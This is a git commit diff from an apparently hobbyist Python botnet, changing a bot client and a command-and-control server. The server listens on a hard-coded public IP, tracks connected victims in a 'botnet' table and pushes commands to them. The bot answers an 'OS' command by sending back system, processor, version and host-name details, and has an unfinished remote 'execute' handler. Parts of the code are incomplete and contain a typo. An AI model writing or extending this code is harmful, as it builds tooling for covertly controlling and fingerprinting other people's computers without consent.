a039344b6dac81ab57944eb23d6ffc04de859be2
devesh2003 <deveshthechamp@gmail.com>
2019-04-02 15:37:36 +0530

    u

--- bot.py
+++ bot.py
@@ -3,16 +3,32 @@ import os
 import subprocess
 from multiprocessing import Process,current_process
 import struct
+import platform
 
 def start_session(s):
     while True:
         try:
-            cmd = s.recv(1024)
-            cmd_size = struct.unpack("<H",cmd[:2])
-            cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
+            cmd = s.recv(1024).decode()
+
+            if "OS" in cmd:
+                os_name = platform.system()
+                os_processor = platform.processor()
+                os_info = platform.platfrom()
+                os_user = platform.node()
+                details = "Operating System : %s\n"%(str(os_name))
+                details += "Processor : %s\n"%(str(os_processor))
+                details += "Version : %s\n"%(str(os_info))
+                details += "User(node) : %s\n"%(str(os_user))
+                s.send(details.encode())
+
             if "execute" in cmd:
                 cmd = cmd.strip("execute ")
                 #Pending...
+
+        #    cmd_size = struct.unpack("<H",cmd[:2])
+        #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
+        #    if "execute" in cmd:
+        #        cmd = cmd.strip("execute ")
         except:
             pass
 
--- server.py
+++ server.py
@@ -20,7 +20,7 @@ def start_server(port=2003,ip="142.93.197.240"):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
     s.listen(5)
-    print("\n[*] Server Started!")
+    print("\n[*] Server Started!\n")
     while True:
         bot,addr = s.accept()
         botnet[str(addr[0])] = bot
@@ -32,15 +32,19 @@ def detect_os():
     for bot in botnet:
         botnet[bot].send("OS".encode())
         bot_os = botnet[bot].recv(1024).decode()
+        print("Details for %s : "%(str(bot)))
+        print(bot_os)
+        print("\n\n\n\n")
 
 def exec_command(cmd):
     global botnet
     print("[*] Sending Command Packets...")
     sleep(1)
     for bot in botnet:
-        cmd_size = len(cmd)
-        packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
-        bot.send(packet)
+        botnet[bot].send(cmd.encode())
+        #cmd_size = len(cmd)
+        #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
+        #bot.send(packet)
         #print("[*] Command packet sent")
 
 def process_cmd(cmd):
